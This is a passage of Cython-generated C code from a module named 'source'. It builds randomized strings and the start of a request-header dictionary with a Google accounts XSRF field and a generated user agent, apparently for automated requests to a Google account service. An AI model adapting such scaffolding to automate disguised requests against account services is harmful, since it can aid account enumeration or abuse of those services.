        __pyx_t_1 = PyTuple_GET_ITEM(__pyx_t_2, __pyx_t_3); __Pyx_INCREF(__pyx_t_1); __pyx_t_3++; if (unlikely(0 < 0)) __PYX_ERR(0, 281, __pyx_L1_error)
        #else
        __pyx_t_1 = PySequence_ITEM(__pyx_t_2, __pyx_t_3); __pyx_t_3++; if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 281, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_1);
        #endif
      }
    } else {
      __pyx_t_1 = __pyx_t_4(__pyx_t_2);
      if (unlikely(!__pyx_t_1)) {
        PyObject* exc_type = PyErr_Occurred();
        if (exc_type) {
          if (likely(__Pyx_PyErr_GivenExceptionMatches(exc_type, PyExc_StopIteration))) PyErr_Clear();
          else __PYX_ERR(0, 281, __pyx_L1_error)
        }
        break;
      }
      __Pyx_GOTREF(__pyx_t_1);
    }
    __Pyx_XGOTREF(__pyx_cur_scope->__pyx_v_i);
    __Pyx_XDECREF_SET(__pyx_cur_scope->__pyx_v_i, __pyx_t_1);
    __Pyx_GIVEREF(__pyx_t_1);
    __pyx_t_1 = 0;
    __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_cc); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 281, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_5);
    __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_yy); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 281, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_6);
    __pyx_t_7 = NULL;
    if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_5))) {
      __pyx_t_7 = PyMethod_GET_SELF(__pyx_t_5);
      if (likely(__pyx_t_7)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_5);
        __Pyx_INCREF(__pyx_t_7);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_5, function);
      }
    }
    __pyx_t_1 = (__pyx_t_7) ? __Pyx_PyObject_Call2Args(__pyx_t_5, __pyx_t_7, __pyx_t_6) : __Pyx_PyObject_CallOneArg(__pyx_t_5, __pyx_t_6);
    __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
    __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
    if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 281, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
    if (unlikely(__Pyx_ListComp_Append(__pyx_r, (PyObject*)__pyx_t_1))) __PYX_ERR(0, 281, __pyx_L1_error)
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  }
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  CYTHON_MAYBE_UNUSED_VAR(__pyx_cur_scope);

  /* function exit code */
  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_r); __pyx_r = 0;
  __Pyx_XDECREF(__pyx_t_1);
  __Pyx_XDECREF(__pyx_t_2);
  __Pyx_XDECREF(__pyx_t_5);
  __Pyx_XDECREF(__pyx_t_6);
  __Pyx_XDECREF(__pyx_t_7);
  __Pyx_AddTraceback("genexpr", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_L0:;
  __Pyx_XGIVEREF(__pyx_r);
  #if !CYTHON_USE_EXC_INFO_STACK
  __Pyx_Coroutine_ResetAndClearException(__pyx_generator);
  #endif
  __pyx_generator->resume_label = -1;
  __Pyx_Coroutine_clear((PyObject*)__pyx_generator);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}
static PyObject *__pyx_gb_6source_3tll_5generator1(__pyx_CoroutineObject *__pyx_generator, CYTHON_UNUSED PyThreadState *__pyx_tstate, PyObject *__pyx_sent_value); /* proto */



static PyObject *__pyx_pf_6source_3tll_3genexpr(CYTHON_UNUSED PyObject *__pyx_self) {
  struct __pyx_obj_6source___pyx_scope_struct_1_genexpr *__pyx_cur_scope;
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("genexpr", 0);
  __pyx_cur_scope = (struct __pyx_obj_6source___pyx_scope_struct_1_genexpr *)__pyx_tp_new_6source___pyx_scope_struct_1_genexpr(__pyx_ptype_6source___pyx_scope_struct_1_genexpr, __pyx_empty_tuple, NULL);
  if (unlikely(!__pyx_cur_scope)) {
    __pyx_cur_scope = ((struct __pyx_obj_6source___pyx_scope_struct_1_genexpr *)Py_None);
    __Pyx_INCREF(Py_None);
    __PYX_ERR(0, 282, __pyx_L1_error)
  } else {
    __Pyx_GOTREF(__pyx_cur_scope);
  }
  {
    __pyx_CoroutineObject *gen = __Pyx_Generator_New((__pyx_coroutine_body_t) __pyx_gb_6source_3tll_5generator1, NULL, (PyObject *) __pyx_cur_scope, __pyx_n_s_genexpr, __pyx_n_s_tll_locals_genexpr, __pyx_n_s_source); if (unlikely(!gen)) __PYX_ERR(0, 282, __pyx_L1_error)
    __Pyx_DECREF(__pyx_cur_scope);
    __Pyx_RefNannyFinishContext();
    return (PyObject *) gen;
  }

  /* function exit code */
  __pyx_L1_error:;
  __Pyx_AddTraceback("source.tll.genexpr", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __Pyx_DECREF(((PyObject *)__pyx_cur_scope));
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_gb_6source_3tll_5generator1(__pyx_CoroutineObject *__pyx_generator, CYTHON_UNUSED PyThreadState *__pyx_tstate, PyObject *__pyx_sent_value) /* generator body */
{
  struct __pyx_obj_6source___pyx_scope_struct_1_genexpr *__pyx_cur_scope = ((struct __pyx_obj_6source___pyx_scope_struct_1_genexpr *)__pyx_generator->closure);
  PyObject *__pyx_r = NULL;
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  Py_ssize_t __pyx_t_3;
  PyObject *(*__pyx_t_4)(PyObject *);
  PyObject *__pyx_t_5 = NULL;
  PyObject *__pyx_t_6 = NULL;
  PyObject *__pyx_t_7 = NULL;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("genexpr", 0);
  switch (__pyx_generator->resume_label) {
    case 0: goto __pyx_L3_first_run;
    default: /* CPython raises the right error here */
    __Pyx_RefNannyFinishContext();
    return NULL;
  }
  __pyx_L3_first_run:;
  if (unlikely(!__pyx_sent_value)) __PYX_ERR(0, 282, __pyx_L1_error)
  __pyx_r = PyList_New(0); if (unlikely(!__pyx_r)) __PYX_ERR(0, 282, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_r);
  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_rr); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 282, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_2 = __Pyx_PyObject_Call(__pyx_t_1, __pyx_tuple__22, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 282, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_PyObject_CallOneArg(__pyx_builtin_range, __pyx_t_2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 282, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  if (likely(PyList_CheckExact(__pyx_t_1)) || PyTuple_CheckExact(__pyx_t_1)) {
    __pyx_t_2 = __pyx_t_1; __Pyx_INCREF(__pyx_t_2); __pyx_t_3 = 0;
    __pyx_t_4 = NULL;
  } else {
    __pyx_t_3 = -1; __pyx_t_2 = PyObject_GetIter(__pyx_t_1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 282, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __pyx_t_4 = Py_TYPE(__pyx_t_2)->tp_iternext; if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 282, __pyx_L1_error)
  }
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  for (;;) {
    if (likely(!__pyx_t_4)) {
      if (likely(PyList_CheckExact(__pyx_t_2))) {
        if (__pyx_t_3 >= PyList_GET_SIZE(__pyx_t_2)) break;
        #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
        __pyx_t_1 = PyList_GET_ITEM(__pyx_t_2, __pyx_t_3); __Pyx_INCREF(__pyx_t_1); __pyx_t_3++; if (unlikely(0 < 0)) __PYX_ERR(0, 282, __pyx_L1_error)
        #else
        __pyx_t_1 = PySequence_ITEM(__pyx_t_2, __pyx_t_3); __pyx_t_3++; if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 282, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_1);
        #endif
      } else {
        if (__pyx_t_3 >= PyTuple_GET_SIZE(__pyx_t_2)) break;
        #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
        __pyx_t_1 = PyTuple_GET_ITEM(__pyx_t_2, __pyx_t_3); __Pyx_INCREF(__pyx_t_1); __pyx_t_3++; if (unlikely(0 < 0)) __PYX_ERR(0, 282, __pyx_L1_error)
        #else
        __pyx_t_1 = PySequence_ITEM(__pyx_t_2, __pyx_t_3); __pyx_t_3++; if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 282, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_1);
        #endif
      }
    } else {
      __pyx_t_1 = __pyx_t_4(__pyx_t_2);
      if (unlikely(!__pyx_t_1)) {
        PyObject* exc_type = PyErr_Occurred();
        if (exc_type) {
          if (likely(__Pyx_PyErr_GivenExceptionMatches(exc_type, PyExc_StopIteration))) PyErr_Clear();
          else __PYX_ERR(0, 282, __pyx_L1_error)
        }
        break;
      }
      __Pyx_GOTREF(__pyx_t_1);
    }
    __Pyx_XGOTREF(__pyx_cur_scope->__pyx_v_i);
    __Pyx_XDECREF_SET(__pyx_cur_scope->__pyx_v_i, __pyx_t_1);
    __Pyx_GIVEREF(__pyx_t_1);
    __pyx_t_1 = 0;
    __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_cc); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 282, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_5);
    __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_yy); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 282, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_6);
    __pyx_t_7 = NULL;
    if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_5))) {
      __pyx_t_7 = PyMethod_GET_SELF(__pyx_t_5);
      if (likely(__pyx_t_7)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_5);
        __Pyx_INCREF(__pyx_t_7);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_5, function);
      }
    }
    __pyx_t_1 = (__pyx_t_7) ? __Pyx_PyObject_Call2Args(__pyx_t_5, __pyx_t_7, __pyx_t_6) : __Pyx_PyObject_CallOneArg(__pyx_t_5, __pyx_t_6);
    __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
    __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
    if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 282, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
    if (unlikely(__Pyx_ListComp_Append(__pyx_r, (PyObject*)__pyx_t_1))) __PYX_ERR(0, 282, __pyx_L1_error)
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  }
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  CYTHON_MAYBE_UNUSED_VAR(__pyx_cur_scope);

  /* function exit code */
  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_r); __pyx_r = 0;
  __Pyx_XDECREF(__pyx_t_1);
  __Pyx_XDECREF(__pyx_t_2);
  __Pyx_XDECREF(__pyx_t_5);
  __Pyx_XDECREF(__pyx_t_6);
  __Pyx_XDECREF(__pyx_t_7);
  __Pyx_AddTraceback("genexpr", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_L0:;
  __Pyx_XGIVEREF(__pyx_r);
  #if !CYTHON_USE_EXC_INFO_STACK
  __Pyx_Coroutine_ResetAndClearException(__pyx_generator);
  #endif
  __pyx_generator->resume_label = -1;
  __Pyx_Coroutine_clear((PyObject*)__pyx_generator);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}
static PyObject *__pyx_gb_6source_3tll_8generator2(__pyx_CoroutineObject *__pyx_generator, CYTHON_UNUSED PyThreadState *__pyx_tstate, PyObject *__pyx_sent_value); /* proto */



static PyObject *__pyx_pf_6source_3tll_6genexpr(CYTHON_UNUSED PyObject *__pyx_self) {
  struct __pyx_obj_6source___pyx_scope_struct_2_genexpr *__pyx_cur_scope;
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("genexpr", 0);
  __pyx_cur_scope = (struct __pyx_obj_6source___pyx_scope_struct_2_genexpr *)__pyx_tp_new_6source___pyx_scope_struct_2_genexpr(__pyx_ptype_6source___pyx_scope_struct_2_genexpr, __pyx_empty_tuple, NULL);
  if (unlikely(!__pyx_cur_scope)) {
    __pyx_cur_scope = ((struct __pyx_obj_6source___pyx_scope_struct_2_genexpr *)Py_None);
    __Pyx_INCREF(Py_None);
    __PYX_ERR(0, 283, __pyx_L1_error)
  } else {
    __Pyx_GOTREF(__pyx_cur_scope);
  }
  {
    __pyx_CoroutineObject *gen = __Pyx_Generator_New((__pyx_coroutine_body_t) __pyx_gb_6source_3tll_8generator2, NULL, (PyObject *) __pyx_cur_scope, __pyx_n_s_genexpr, __pyx_n_s_tll_locals_genexpr, __pyx_n_s_source); if (unlikely(!gen)) __PYX_ERR(0, 283, __pyx_L1_error)
    __Pyx_DECREF(__pyx_cur_scope);
    __Pyx_RefNannyFinishContext();
    return (PyObject *) gen;
  }

  /* function exit code */
  __pyx_L1_error:;
  __Pyx_AddTraceback("source.tll.genexpr", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __Pyx_DECREF(((PyObject *)__pyx_cur_scope));
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_gb_6source_3tll_8generator2(__pyx_CoroutineObject *__pyx_generator, CYTHON_UNUSED PyThreadState *__pyx_tstate, PyObject *__pyx_sent_value) /* generator body */
{
  struct __pyx_obj_6source___pyx_scope_struct_2_genexpr *__pyx_cur_scope = ((struct __pyx_obj_6source___pyx_scope_struct_2_genexpr *)__pyx_generator->closure);
  PyObject *__pyx_r = NULL;
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  Py_ssize_t __pyx_t_3;
  PyObject *(*__pyx_t_4)(PyObject *);
  PyObject *__pyx_t_5 = NULL;
  PyObject *__pyx_t_6 = NULL;
  PyObject *__pyx_t_7 = NULL;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("genexpr", 0);
  switch (__pyx_generator->resume_label) {
    case 0: goto __pyx_L3_first_run;
    default: /* CPython raises the right error here */
    __Pyx_RefNannyFinishContext();
    return NULL;
  }
  __pyx_L3_first_run:;
  if (unlikely(!__pyx_sent_value)) __PYX_ERR(0, 283, __pyx_L1_error)
  __pyx_r = PyList_New(0); if (unlikely(!__pyx_r)) __PYX_ERR(0, 283, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_r);
  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_rr); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 283, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_2 = __Pyx_PyObject_Call(__pyx_t_1, __pyx_tuple__23, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 283, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_PyObject_CallOneArg(__pyx_builtin_range, __pyx_t_2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 283, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  if (likely(PyList_CheckExact(__pyx_t_1)) || PyTuple_CheckExact(__pyx_t_1)) {
    __pyx_t_2 = __pyx_t_1; __Pyx_INCREF(__pyx_t_2); __pyx_t_3 = 0;
    __pyx_t_4 = NULL;
  } else {
    __pyx_t_3 = -1; __pyx_t_2 = PyObject_GetIter(__pyx_t_1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 283, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __pyx_t_4 = Py_TYPE(__pyx_t_2)->tp_iternext; if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 283, __pyx_L1_error)
  }
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  for (;;) {
    if (likely(!__pyx_t_4)) {
      if (likely(PyList_CheckExact(__pyx_t_2))) {
        if (__pyx_t_3 >= PyList_GET_SIZE(__pyx_t_2)) break;
        #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
        __pyx_t_1 = PyList_GET_ITEM(__pyx_t_2, __pyx_t_3); __Pyx_INCREF(__pyx_t_1); __pyx_t_3++; if (unlikely(0 < 0)) __PYX_ERR(0, 283, __pyx_L1_error)
        #else
        __pyx_t_1 = PySequence_ITEM(__pyx_t_2, __pyx_t_3); __pyx_t_3++; if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 283, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_1);
        #endif
      } else {
        if (__pyx_t_3 >= PyTuple_GET_SIZE(__pyx_t_2)) break;
        #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
        __pyx_t_1 = PyTuple_GET_ITEM(__pyx_t_2, __pyx_t_3); __Pyx_INCREF(__pyx_t_1); __pyx_t_3++; if (unlikely(0 < 0)) __PYX_ERR(0, 283, __pyx_L1_error)
        #else
        __pyx_t_1 = PySequence_ITEM(__pyx_t_2, __pyx_t_3); __pyx_t_3++; if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 283, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_1);
        #endif
      }
    } else {
      __pyx_t_1 = __pyx_t_4(__pyx_t_2);
      if (unlikely(!__pyx_t_1)) {
        PyObject* exc_type = PyErr_Occurred();
        if (exc_type) {
          if (likely(__Pyx_PyErr_GivenExceptionMatches(exc_type, PyExc_StopIteration))) PyErr_Clear();
          else __PYX_ERR(0, 283, __pyx_L1_error)
        }
        break;
      }
      __Pyx_GOTREF(__pyx_t_1);
    }
    __Pyx_XGOTREF(__pyx_cur_scope->__pyx_v_i);
    __Pyx_XDECREF_SET(__pyx_cur_scope->__pyx_v_i, __pyx_t_1);
    __Pyx_GIVEREF(__pyx_t_1);
    __pyx_t_1 = 0;
    __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_cc); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 283, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_5);
    __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_yy); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 283, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_6);
    __pyx_t_7 = NULL;
    if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_5))) {
      __pyx_t_7 = PyMethod_GET_SELF(__pyx_t_5);
      if (likely(__pyx_t_7)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_5);
        __Pyx_INCREF(__pyx_t_7);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_5, function);
      }
    }
    __pyx_t_1 = (__pyx_t_7) ? __Pyx_PyObject_Call2Args(__pyx_t_5, __pyx_t_7, __pyx_t_6) : __Pyx_PyObject_CallOneArg(__pyx_t_5, __pyx_t_6);
    __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
    __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
    if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 283, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
    if (unlikely(__Pyx_ListComp_Append(__pyx_r, (PyObject*)__pyx_t_1))) __PYX_ERR(0, 283, __pyx_L1_error)
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  }
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  CYTHON_MAYBE_UNUSED_VAR(__pyx_cur_scope);

  /* function exit code */
  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_r); __pyx_r = 0;
  __Pyx_XDECREF(__pyx_t_1);
  __Pyx_XDECREF(__pyx_t_2);
  __Pyx_XDECREF(__pyx_t_5);
  __Pyx_XDECREF(__pyx_t_6);
  __Pyx_XDECREF(__pyx_t_7);
  __Pyx_AddTraceback("genexpr", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_L0:;
  __Pyx_XGIVEREF(__pyx_r);
  #if !CYTHON_USE_EXC_INFO_STACK
  __Pyx_Coroutine_ResetAndClearException(__pyx_generator);
  #endif
  __pyx_generator->resume_label = -1;
  __Pyx_Coroutine_clear((PyObject*)__pyx_generator);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}



static PyObject *__pyx_pf_6source_12tll(CYTHON_UNUSED PyObject *__pyx_self) {
  PyObject *__pyx_v_n1 = NULL;
  PyObject *__pyx_v_n2 = NULL;
  PyObject *__pyx_v_host = NULL;
  PyObject *__pyx_v_he3 = NULL;
  PyObject *__pyx_v_res1 = NULL;
  PyObject *__pyx_v_tok = NULL;
  PyObject *__pyx_v_cookies = NULL;
  PyObject *__pyx_v_headers = NULL;
  PyObject *__pyx_v_data = NULL;
  PyObject *__pyx_v_response = NULL;
  PyObject *__pyx_v_tl = NULL;
  PyObject *__pyx_v_f = NULL;
  PyObject *__pyx_v_e = NULL;
  PyObject *__pyx_gb_6source_3tll_2generator = 0;
  PyObject *__pyx_gb_6source_3tll_5generator1 = 0;
  PyObject *__pyx_gb_6source_3tll_8generator2 = 0;
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  PyObject *__pyx_t_3 = NULL;
  PyObject *__pyx_t_4 = NULL;
  PyObject *__pyx_t_5 = NULL;
  PyObject *__pyx_t_6 = NULL;
  PyObject *__pyx_t_7 = NULL;
  PyObject *__pyx_t_8 = NULL;
  int __pyx_t_9;
  PyObject *__pyx_t_10 = NULL;
  Py_ssize_t __pyx_t_11;
  Py_UCS4 __pyx_t_12;
  PyObject *__pyx_t_13 = NULL;
  PyObject *__pyx_t_14 = NULL;
  PyObject *__pyx_t_15 = NULL;
  PyObject *__pyx_t_16 = NULL;
  PyObject *__pyx_t_17 = NULL;
  int __pyx_t_18;
  int __pyx_t_19;
  int __pyx_t_20;
  char const *__pyx_t_21;
  PyObject *__pyx_t_22 = NULL;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("tll", 0);

  
  {
    __Pyx_PyThreadState_declare
    __Pyx_PyThreadState_assign
    __Pyx_ExceptionSave(&__pyx_t_1, &__pyx_t_2, &__pyx_t_3);
    __Pyx_XGOTREF(__pyx_t_1);
    __Pyx_XGOTREF(__pyx_t_2);
    __Pyx_XGOTREF(__pyx_t_3);
    /*try:*/ {

      
      __pyx_t_4 = __pyx_pf_6source_3tll_genexpr(NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 281, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __pyx_t_5 = __Pyx_Generator_Next(__pyx_t_4); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 281, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      __pyx_t_4 = PyUnicode_Join(__pyx_kp_u__24, __pyx_t_5); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 281, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      __pyx_v_n1 = ((PyObject*)__pyx_t_4);
      __pyx_t_4 = 0;

      
      __pyx_t_4 = __pyx_pf_6source_3tll_3genexpr(NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 282, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __pyx_t_5 = __Pyx_Generator_Next(__pyx_t_4); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 282, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      __pyx_t_4 = PyUnicode_Join(__pyx_kp_u__24, __pyx_t_5); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 282, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      __pyx_v_n2 = ((PyObject*)__pyx_t_4);
      __pyx_t_4 = 0;

      
      __pyx_t_4 = __pyx_pf_6source_3tll_6genexpr(NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 283, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __pyx_t_5 = __Pyx_Generator_Next(__pyx_t_4); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 283, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      __pyx_t_4 = PyUnicode_Join(__pyx_kp_u__24, __pyx_t_5); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 283, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      __pyx_v_host = __pyx_t_4;
      __pyx_t_4 = 0;

      
      __pyx_t_4 = __Pyx_PyDict_NewPresized(5); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 285, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      if (PyDict_SetItem(__pyx_t_4, __pyx_n_u_accept, __pyx_kp_u__25) < 0) __PYX_ERR(0, 285, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_accept_language, __pyx_kp_u_ar_IQ_ar_q_0_9_en_IQ_q_0_8_en_q) < 0) __PYX_ERR(0, 285, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_content_type, __pyx_kp_u_application_x_www_form_urlencode) < 0) __PYX_ERR(0, 285, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_google_accounts_xsrf, __pyx_kp_u_1) < 0) __PYX_ERR(0, 285, __pyx_L3_error)

      
      __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_ggb); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 289, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_6);
      __pyx_t_7 = NULL;
      if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_6))) {
        __pyx_t_7 = PyMethod_GET_SELF(__pyx_t_6);
        if (likely(__pyx_t_7)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
          __Pyx_INCREF(__pyx_t_7);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_6, function);
        }
      }
      __pyx_t_5 = (__pyx_t_7) ? __Pyx_PyObject_CallOneArg(__pyx_t_6, __pyx_t_7) : __Pyx_PyObject_CallNoArg(__pyx_t_6);
      __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
      if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 289, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      __pyx_t_6 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyUnicode_Type)), __pyx_t_5); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 289, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_user_agent, __pyx_t_6) < 0) __PYX_ERR(0, 285, __pyx_L3_error)
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      __pyx_v_he3 = ((PyObject*)__pyx_t_4);
      __pyx_t_4 = 0;

      
